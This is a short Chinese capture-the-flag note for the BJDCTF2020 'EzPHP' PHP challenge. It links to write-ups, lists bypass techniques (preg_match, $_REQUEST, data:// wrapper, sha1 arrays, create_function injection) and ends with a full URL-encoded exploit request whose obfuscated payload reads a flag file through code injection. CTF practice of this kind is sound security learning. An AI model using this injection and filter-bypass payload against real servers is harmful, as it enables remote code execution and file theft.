# WP
[[BJDCTF2020]EzPHP](https://zhuanlan.zhihu.com/p/424128522)<br />[[BJDCTF2020]EzPHP - Rabbittt - 博客园](https://www.cnblogs.com/rabbittt/p/13323155.html#%E7%AC%AC%E5%85%AD%E6%AD%A5%E9%87%8D%E7%82%B9)
# 知识点
1.[$_SERVER 函数中‘QUERY_STRING’](http://blog.sina.com.cn/s/blog_686999de0100jgda.html)<br />2.[preg_match绕过](https://www.cnblogs.com/20175211lyz/p/12198258.html)<br />3.$_REQUEST绕过<br />4.file_get_contents绕过([文件包含漏洞](https://www.freebuf.com/articles/web/182280.html))<br />5.sha1比较<br />6.create_function()代码注入
```python
/1nD3x.php?file=data://text/plain,%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&%73%68%61%6e%61[]=1&%70%61%73%73%77%64[]=2&%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&%66%6c%61%67[%63%6f%64%65]=create_function&%66%6c%61%67[%61%72%67]=}(~%8D%9A%9E%9B%99%96%93%9A)(~%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F);//
```
